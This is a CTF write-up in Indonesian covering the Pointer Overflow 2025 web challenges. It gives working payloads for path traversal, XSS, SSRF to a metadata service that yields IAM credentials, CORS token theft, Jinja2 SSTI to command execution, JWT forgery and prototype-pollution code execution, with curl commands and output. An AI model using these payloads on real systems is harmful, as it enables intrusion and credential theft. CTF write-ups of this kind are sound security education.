@@ -1,0 +1,364 @@
+---
+layout: post
+title: "Pointer Overflow 2025 - Web"
+date: 2025-11-16
+categories: ["POCTF"]
+tags: [ctf, web, ctf2025]
+excerpt: "Writeup web security for pointer overflow ctf"
+---
+
+## 100-1 — All Paths Lead Home
+
+### Overview
+
+Di challenge ini kita diminta membaca file `flag.txt` yang ada di target `http://web100-1.pointeroverflowctf.com/`, yang disimpan di `/secret/`, sementara aplikasi web cuma mau *ngeladenin* file `.txt` biasa lewat endpoint `/view`. Gampang kelihatannya, tapi jelas ada filter yang ngeblok ketika saya melakukan path traversal standar(../../).
+
+### Recon
+
+Step awal, saya membuka halaman utama dan coba akses `note.txt`. Responsnya normal, jadi endpoint `/view?file=note.txt` memang jalan. Tapi waktu coba akses `../secret/flag.txt`, server langsung return `400 blocked`. Lalu di halaman `/docs/legacy.html` ketemu hint soal `legacy=1` dan penjelasan tentang encoding UTF-7 dengan format shifted `+...-` buat karakter yang nggak boleh muncul langsung (misalnya `/` dan `.`).
+
+### Exploitation
+
+Karena server ngasih tahu harus pakai UTF-7, tinggal encode karakter sensitif saja:
+
+```text
+"." -> +AC4-
+"/" -> +AC8-
+```
+
+Sisanya biarin plain karena huruf biasa nggak perlu di-encode. Jadi path `../../secret/flag.txt` harusnya dikonversi jadi `+AC4-+AC4-+AC8-secret+AC8-flag.txt`. Jangan lupa aktifin juga legacy mode nya dengan nambahin `legacy=1` di query string.
+
+### Payload
+
+```bash
+/view?legacy=1&file=%2BAC4-%2BAC4-%2BAC8-secret%2BAC8-flag.txt
+```
+
+Kita pakai URL encode biar tanda `+` dan `-` nggak diutak-atik browser.
+
+### Flag
+`poctf{uwsp_c4nc3l_m3_0rd3r5}`
+
+
+## 100-2 — This Must Be the Place
+
+### Overview
+
+Challenge ini minta kita nemuin cara supaya halaman `https://web100-2.pointeroverflowctf.com/` nge-run JavaScript kita sendiri, terus pake script nya buat baca flag via `fetch` ke endpoint `/flag`. Konteksnya, jadi si developer udah nambah filter char, tapi nyatanya output user tetap di raw di HTML.
+
+### Recon
+
+- Endpoint utama nerima query `name` dan nampilin value itu langsung di `<div id="results">`.
+- Karena gak ada escaping berarti kita bisa nyisipin tag HTML, termasuk `<script>`.
+- Ada snippet `<script>window.FLAG_TOKEN = "...";</script>` di setiap halaman. Ini berarti kalau kita berhasil melakukan XSS, kita otomatis bisa akses token yang dibutuhin buat request flag.
+
+### Exploitation
+
+Catatan timing: di halaman, `<script>window.FLAG_TOKEN = "...";</script>` muncul SETELAH `<div id="results">`. Kalau kita langsung eksekusi `fetch` saat injeksi, ada risiko `window.FLAG_TOKEN` belum ke-set. Maka payload sebaiknya nunggu `DOMContentLoaded` dulu.
+
+Payload:
+
+```js
+<script>
+addEventListener('DOMContentLoaded', () => {
+  fetch('/flag', { headers: { 'X-Flag-Token': window.FLAG_TOKEN } })
+    .then(res => res.text())
+    .then(flag => alert(flag));
+});
+</script>
+```
+
+eksekusi ke target, kita encode payloadnya dengan url encode:
+
+```text
+https://web100-2.pointeroverflowctf.com/?name=%3Cscript%3EaddEventListener%28%27DOMContentLoaded%27%2C%28%29%3D%3Efetch%28%27%2Fflag%27%2C%7Bheaders%3A%7B%27X-Flag-Token%27%3Awindow.FLAG_TOKEN%7D%7D%29.then%28r%3D%3Er.text%28%29%29.then%28flag%3D%3Ealert%28flag%29%29%29%3C%2Fscript%3E
+```
+
+Begitu halaman selesai diparse, listener jalan (same-origin), nge read `window.FLAG_TOKEN`, lalu `fetch` ke `/flag` dengan header valid dan nunjukkan flag via `alert`.
+
+### Flag
+`poctf{uwsp_1_d0_b173_my_7humb_51r}`
+
+
+## 100-3 — Mason, Initiate
+
+### Overview
+
+Challengen ini ngebuat kita main-main sama SSRF di endpoint `fetch` yang kerjaannya nge hook konten dari URL yang kita kasih. Servernya jalanin request dari sisi mereka sendiri, jadi kita bisa coba arahin ke internal service yang nggak bisa kita akses langsung dari browser.
+
+### Recon
+
+- Cek landing page buat confirm ada form `fetch?url=...`.
+- Manfaatin SSRF dengan taruh URL ke `127.0.0.1:8081` karena metadata service cuma kebuka di localhost/loopback.
+- Enum path `latest/meta-data/` supaya tahu ada apa aja di dalamnya.
+- Dari list yang keluar, fokus ke bagian `iam/security-credentials/` karena biasanya nyimpen credential menarik.
+
+### Exploitation
+
+1. Kita test SSRF pakai URL eksternal buat confirm:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=https://httpbin.org/ip'
+   ```
+2. Lalu Pivot ke internal metadata service:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/'
+   ```
+   Outputnya nunjukin beberapa entry termasuk `iam/`.
+   ```
+   instance-id
+   iam/
+   local-ipv4
+   ```
+   
+3. Lanjut telusuri credential:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/'
+   ```
+   Di sini ketemu role bernama `poctf-role`.
+4. Ambil data role tersebut buat dapetin token:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/poctf-role'
+   ```
+
+### Flag
+
+Respons terakhir ngasih JSON berisi `AccessKeyId`, `SecretAccessKey`, dan `Token`. Flag-nya ada di field `Token`:
+```
+poctf{uwsp_4rc4n3_1n1t14t3}
+```
+
+### Notes
+
+- Endpoint metadata-nya mirip layout AWS, jadi teknik enumerasi pakai path umum kepake banget.
+
+
+
+## 200-1 — What's Mine is Yours
+
+### Overview
+
+Di challenge ini targetnya: `https://web200-1.pointeroverflowctf.com/`. Login dulu biar dapet `sid`, terus minta `/api/token` sambil spoof `Origin` dan include cookie. Server nge refleksi origin + allow credentials, jadi token bocor via CORS. Pakai token itu sebagai `X-Flag-Token` ke `/api/flag` (POST) buat ngambil flag.
+
+### Recon
+
+- Di landing page kasih hint soal `/login`, `/api/me`, dan `/api/token`. Ini emua pakai session cookie.
+- Cek manual `POST /login`, dapat `sid` dengan `SameSite=None`, artinya siap buat cross-site requests.
+- Tes CORS dengan `Origin: https://hadespwn.me`, server langsung balikin `Access-Control-Allow-Origin` yang sama, plus `Access-Control-Allow-Credentials: true`. Red flag banget.
+
+### Exploitation
+
+1. `POST /login` → ambil cookie `sid=...`.
+2. Request ke `/api/token` tapi tambahin `Origin: https://hadespwn.me` dan include cookie (`credentials: include` kalau lewat browser). Server akan validasi session, terus nge response `{"apiToken": ...}` sementara Response header mengizinkan origin palsu buat baca respons.
+3. Kirim `POST /api/flag` dengan header `X-Flag-Token: <apiToken>` plus session cookie yang sama. Balik flag.
+
+### Flag
+
+`poctf{uwsp_cr_7w3n7y_64z3b0_7pk}`
+
+
+## 200-2 — The Gift Horse
+
+### Overview
+
+Di challange ini yang diberikan adalah sebuah url : https://web200-2.pointeroverflowctf.com. Target ngasih fitur upload video dan comment, tapi banyak hint soal file browser-based exploit. Lalu directory fuzzing pakai `ffuf` dan nemu `phpinfo.php` yang kebuka bebas. `phpinfo()` nge-spill environment `FLAG`, jadi tinggal `curl` dan selesai.
+
+### Recon
+
+Mulai dengan `curl` buat lihat halaman utama. Ada single-page video player dengan form upload (`/upload.php`) dan comment (`/comments.php`). Di kolom komentar banyak payload XSS, mungkin banyak user yang test xss disitu LOL.
+
+Karena nggak ada link menarik, aku langsung brute force path pakai ffuf:
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://web200-2.pointeroverflowctf.com/FUZZ.php -fs 52370
+```
+
+Filter `-fs 52370` biar halaman utama yang gede ke-skip. Dari output muncul `phpinfo.php` sama `config.php`.
+
+### Exploitation
+`phpinfo.php` biasanya sengaja disembunyikan karena bisa bocorin environment. Jadi langsung:
+
+```bash
+curl -s 'https://web200-2.pointeroverflowctf.com/phpinfo.php' | rg 'FLAG'
+```
+
+Responnya nunjukin beberapa field `FLAG` (di bagian core value, `$_SERVER`, dan `$_ENV`). Nggak ada proteksi tambahan, jadi flag tinggal dibaca mentah.
+
+### Flag
+```
+poctf{uwsp_ju57_bl0w1n6_5m0k3}
+```
+
+
+## 200-3 — Chiaroscuro
+
+### Overview
+
+Intinya pada challange ini, di target: `https://web200-3.pointeroverflowctf.com/` ada Server-Side Template Injection (SSTI) di endpoint `POST /api/view` yang aktif ketika profile di-set ke "conservation". Dari SSTI ini bisa escalate jadi RCE dan baca flag.
+
+### Recon
+
+- Halaman utama punya form untuk ganti "Viewing profile" antara `display` dan `conservation` via `POST /set-profile` yang ngasih cookie `preview_mode`.
+- Ada form "Annotations" yang submit ke `POST /api/view` dengan field `notes`.
+- Di mode `display`, output `notes` disanitasi (keluar yang di input apa adanya di HTML). Di mode `conservation`, server kelihatan nge-render isi `notes` sebagai Jinja template string.
+
+### Vulnerability
+
+Hasil recon di atas bisa kita simpulin kalo: 
+- Tipe: Server-Side Template Injection (SSTI) — Jinja2
+- Trigger: `notes` diproses sebagai template ketika `preview_mode=conservation`.
+- Dampak: Arbitrary template evaluation → akses ke `__globals__` → import modul → RCE, file read, dll.
+
+### Exploitation
+
+1) Switch ke conservation profile (set cookie):
+```bash
+curl -i -c cookies.txt -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/set-profile' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'mode=conservation'
+```
+
+2) Verifikasi SSTI sederhana:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'notes={{7*7}}'
+# output: 49
+```
+
+3) Ekspos globals dan builtins untuk akses import:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__.keys()|list}}'
+  
+  ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'functools', 'sys', 't', 'abc', 'chain',
+'escape', 'Markup', 'soft_str', 'auto_aiter', 'auto_await', 'TemplateNotFound', 'TemplateRuntimeError', 'UndefinedError', 'EvalContext', '_PassArg', 'concat', 'internalcode', 'missing', 'Namespace', 'object_type_repr', 'pass_eval_context', 'V', 'F', 'exported', 'async_exported', 'identity', 'markup_join', 'str_join', 'new_context', 'TemplateReference', '_dict_method_all', 'Context', 'BlockReference', 'LoopContext', 'AsyncLoopContext', 'Macro', 'Undefined', 'make_logging_undefined', 'ChainableUndefined', 'DebugUndefined', 'StrictUndefined']
+```
+
+4) RCE via `__import__('os').popen(...)` lalu list root untuk cari flag:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').popen(\'ls -la /\').read()}}'
+  
+  drwxr-xr-x   1 root root 4096 Nov  3 02:08 etc
+-rw-rw-rw-   1 root root   36 Oct 22 22:21 flag.txt
+drwxr-xr-x   1 root root 4096 Nov  3 00:08 home
+```
+
+5) Baca flag:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').popen(\'cat /flag.txt\').read()}}'
+```
+
+### Flag
+- `poctf{uwsp_b34u7y_15_l16h7_4nd_d4rk}`
+
+### Root Cause
+
+- Di mode `conservation`, server nge-render input user sebagai Jinja template string (kemungkinan via `render` pada template yang dibentuk dari input langsung). Karena nggak ada sandbox/isolasi dan input tidak di-escape, attacker bisa akses `config.__class__.__init__.__globals__` ➜ builtins ➜ `__import__` ➜ `os.popen`.
+
+### Notes
+
+- Di mode `display`, endpoint sebelumnya menampilkan HTML wrapper dan content disanitasi; beda banget dengan mode `conservation` yang langsung nge-return hasil evaluasi string. Perbedaan behavior ini yang jadi celah SSTI.
+- `{{request...}}` atau akses context lain ada yang diblokir (ngasih error), tapi chain lewat `config.__class__.__init__.__globals__` cukup buat nembus ke builtins.
+
+## 300-1 — Friend of a Friend
+
+### Overview
+
+Flag didapat dengan memanfaatkan shared secret HS256 yang muncul di JWKS publik. Secret itu dipakai buat forge JWT yang claim `aud`-nya jadi `admin-app`, terus token hasil forge dipakai buat nge hit `/api/flag` di target : `http://web300-1.pointeroverflowctf.com/index.html`.
+
+### Recon
+
+- In description: DNS may not be available for this instance. If the challenge hostname does not resolve, use the public IP 34.9.14.80 and send the Host header web300-2.pointeroverflowctf.com.
+- Landing page nunjukin flow OAuth sederhana plus link ke `/.well-known/openid-configuration`.
+- Discovery JSON ngasih tau kalau alg-nya HS256 dan JWKS ada di `/.well-known/jwks.json`.
+- Dan boom!!! JWKS ternyata langsung bocorin key base64 `ZGV2c2hhcmVkc2VjcmV0` (alias `devsharedsecret`).
+
+### Exploitation
+
+1. Jalanin demo auth flow lewat `GET /auth/start?client_id=profile-app...` biar dapet `code` di `/callback`.
+2. Exchange code tadi ke `/oauth/token` dengan `client_id=profile-app` + `grant_type=authorization_code` + `redirect_uri` yang sama. Hasilnya akses token valid tapi `aud`-nya `profile-app`.
+3. Karena secret HS256 sudah dapet, tinggal forge aja JWT manual pakai library (misal `pyjwt`) dengan claim:
+   - `iss`: `https://friend.example/oauth`
+   - `sub`: `user123`
+   - `aud`: `admin-app`
+   - `scope`: `profile:read friends:read`
+   - `typ`: `access_token`
+   - `iat` / `exp`: (bebas aja masukin berapa, asal masih masuk akal :))
+4. Kirim token forge ke `GET https://web300-1.pointeroverflowctf.com/api/flag` pakai header `Authorization: Bearer <token>`.
+5. Response bakalan return flag: `poctf{uwsp_4_fr13nd_1n_n33d_15_4_fr13nd_1nd33d}`.
+
+### Root Cause
+
+Admin API masih mengandalkan shared secret yang sama dengan client biasa. Karena JWKS kebuka ke publik dan berisi symmetric key, jadi siapa pun bisa bikin token dengan audience apa pun termasuk `admin-app`. Makanya admin seharusnya pakai RS256 dengan private key dan jangan di publish keluar dari server, atau juga jangan publish symmetric key nya di JWKS.
+
+
+## 300-2 — The Shape of Water
+
+### Overview
+
+Server target kali ini ngizinin `POST /api/settings` buat merge JSON ke config global tanpa di sanitasi. Prototype pollution bikin `NODE_OPTIONS` kebawa ke proses build. Pas `GET /api/build`, Node ngerun payload `cp /flag.txt /public/flag.txt`. Flag diambil lewat `GET /flag.txt` karena folder `/public` diserve statis.
+
+### Recon
+
+1. Cek info service target pake:
+   ```bash
+   curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/api/version
+   
+   {"name":"Lacustrine Conservancy Preview","version":"1.2.0-preview"}
+   ```
+   Respon nunjukkin server Node.js preview service.
+2. `GET /api/debug/cfg` ngebuktiin config global bisa dibaca dan keliatan ada properti turunan.
+3. Endpoint `POST /api/reset` cuma bersihin state biasa, tapi ga ngehapus pollution di prototype.
+
+### Vulnerability
+
+- Merge confignya pake `Object.assign` (atau mirip) tanpa filter key spesial.
+- Input `__proto__` nge-set property di `Object.prototype`, jadi seluruh objek baru kebawa malicious value nya.
+- Build worker rely sama config itu buat set environment/CLI options, jadi `NODE_OPTIONS` ketimpa value kita.
+
+### Exploitation
+
+1. Pollute prototype lewat:
+   ```bash
+   curl -sk -X POST \
+     -H 'Host: web300-2.pointeroverflowctf.com' \
+     -H 'Content-Type: application/json' \
+     --data '{"__proto__":{"NODE_OPTIONS":"--eval=require(\"child_process\").execSync(\"cp /flag.txt /public/flag.txt\")"}}' \
+     https://34.9.14.80/api/settings
+   ```
+   Responnya error `RangeError` tapi pollution tetep berhasil (common side-effect).
+2. Trigger build:
+   ```bash
+   curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/api/build
+   
+   /api/build
+[build] newsletter generated
+[build] found exec in config; executing...
+/app
+---FILES---
+./public/newsletter.html
+---FLAG---
+poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+[build] done.
+   ```
+   Worker nge-run Node dengan `NODE_OPTIONS` custom, otomatis nge-copy flag. Sebenarnya disini sudah muncul flag nya, dan sudah cukup.
+3. Ambil flag dari static dir:
+   ```bash
+   curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/flag.txt
+   
+   poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+   ```
+
+### Flag
+`poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}`
+
